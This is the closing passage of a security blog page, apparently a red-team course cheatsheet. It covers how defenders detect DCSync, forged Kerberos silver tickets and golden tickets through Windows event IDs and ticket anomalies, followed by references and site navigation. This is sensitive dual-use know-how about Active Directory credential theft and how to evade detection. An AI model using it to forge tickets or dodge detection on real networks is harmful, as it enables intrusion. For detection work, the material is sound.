highlighter-rouge">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> for <strong>DS-Replication-Get-Changes</strong> and <strong>DS-Replication-Get-Changes-All</strong>, or <code class="language-plaintext highlighter-rouge">89e95b76-444d-4c62-991a-0facbeda640c</code> for <strong>DS-Replication-Get-Changes-In-Filtered-Set</strong>.</ul><li><strong>Silver Tickets</strong><ul><li>In a legitimate ticket exchange, you would expect to have a TGS-REQ and TGS-REP to obtain a service ticket before it can be used.  A TGS-REQ is logged by a domain controller as event ID 4769, which includes information such as the requesting user and the target service.  When a service ticket is used, the target computer also produces a <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624">4624</a> event for the user detailed in the ticket.  Since silver tickets are forged offline, their use produces a 4624 event on the target computer, but there would be no corresponding 4769 event prior to that.<li>Silver tickets may also be detected if they’re forged with inaccurate or anomalous information.  For example, the Kerberos realm (i.e. the domain name) should traditionally be in all uppercase characters.  If a ticket is logged that has the domain in lowercase, then it could be an indication that it’s forged.  Some tools, such as Rubeus, make an effort to convert provided the domain to uppercase to avoid this particular anomaly but your mileage will vary between tools.</ul><li><strong>Golden Ticket</strong><ul><li>Similar strategies as above can be used to detect the use of golden tickets.  In a normal ticket exchange, service tickets must be obtained via a TGS-REQ using a valid TGT.  This TGT is also usually requested by the user (transparently) in an AS-REQ and returned by the KDC in an AS-REP.  These AS-REQs are logged by domain controllers as event ID <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768">4768</a>.  If defenders spot TGS-REQs (or 4769 events) without any prior 4768 event for the user, this may be an indicator that the TGT was forged offline.<li>Anomalous ticket data can also give golden tickets away.  One egregious example is the lifetime data that Mimikatz includes by default.  Most Kerberos domain policies have the maximum lifetime of a ticket set to 10 hours and the maximum lifetime for ticket renewal to 7 days.  That effectively means you can renew a ticket every 10 hours up to a maximum age of 7 days.  However, Mimikatz sets the lifetime of its forged tickets to 10 <em>years</em>.</ul></ul><h2 id="references"><strong>References</strong></h2><ul><li><a href="https://www.zeropointsecurity.co.uk/course/red-team-ops">https://www.zeropointsecurity.co.uk/course/red-team-ops</a><li><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm</a><li><a href="https://www.cobaltstrike.com/blog/why-is-rundll32-exe-connecting-to-the-internet">https://www.cobaltstrike.com/blog/why-is-rundll32-exe-connecting-to-the-internet</a><li><a href="https://www.cobaltstrike.com/blog/cobalt-strike-3-8-whos-your-daddy">https://www.cobaltstrike.com/blog/cobalt-strike-3-8-whos-your-daddy</a><li><a href="https://github.com/WKL-Sec/Malleable-CS-Profiles">https://github.com/WKL-Sec/Malleable-CS-Profiles</a><li><a href="https://www.youtube.com/playlist?list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no">https://www.youtube.com/playlist?list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no</a><li><a href="https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO%20-%20Cheatsheet.md">https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO-Cheatsheet.md</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/certs/'>Certs</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active directory</a> <a href="/tags/redteaming/" class="post-tag no-text-decoration" >redteaming</a> <a href="/tags/certs/" class="post-tag no-text-decoration" >certs</a> <a href="/tags/c2/" class="post-tag no-text-decoration" >c2</a> <a href="/tags/cobalt-strike/" class="post-tag no-text-decoration" >cobalt strike</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Zero-Point Security | Red Team Operator CRTO Commands CheatSheet - וֹtsƒα∂ιη𝔊&url=https://itsfading.github.io/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Zero-Point Security | Red Team Operator CRTO Commands CheatSheet - וֹtsƒα∂ιη𝔊&u=https://itsfading.github.io/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Zero-Point Security | Red Team Operator CRTO Commands CheatSheet - וֹtsƒα∂ιη𝔊&url=https://itsfading.github.io/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">Altered Security | CRTP Commands CheatSheet</a><li><a href="/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/">Zero-Point Security | Red Team Operator CRTO Commands CheatSheet</a><li><a href="/posts/Unrestricted-File-Upload-Leads-to-SSRF-and-RCE/">Unrestricted File Upload Leads to SSRF and RCE</a><li><a href="/posts/Hackerone-Android-challenges-Writeup/">Hackerone Android Challenges Writeups</a><li><a href="/posts/ASCWGs-Qualifications-2022-Writeup/">ASCWGs Qualifications 2022 CTF Web Challenges Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/certs/">certs</a> <a class="post-tag" href="/tags/machines/">machines</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-9"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CRTP-Commands-CheatSheet/"><div class="card-body"> <span class="timeago small" > Dec 4, 2025 <i class="unloaded">2025-12-04T13:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Altered Security | CRTP Commands CheatSheet</h3><div class="text-muted small"><p> Disclaimer This Cheatsheet is simply a quick reference for the commands and techniques covered throughout the course. All the information shared here is directly related to the course material a...</p></div></div></a></div><div class="card"> <a href="/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/"><div class="card-body"> <span class="timeago small" > Jul 26, 2024 <i class="unloaded">2024-07-26T19:52:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge</h3><div class="text-muted small"><p> TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerabi...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Basics/"><div class="card-body"> <span class="timeago small" > Jun 25, 2021 <i class="unloaded">2021-06-25T17:20:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory Basics</h3><div class="text-muted small"><p> Active directory overview what is Active directory? Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CRTP-Commands-CheatSheet/" class="btn btn-outline-primary" prompt="Older"><p>Altered Security | CRTP Commands CheatSheet</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://twitter.com/ItsFadinG_">ItsFadinG</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/certs/">certs</a> <a class="post-tag" href="/tags/machines/">machines</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
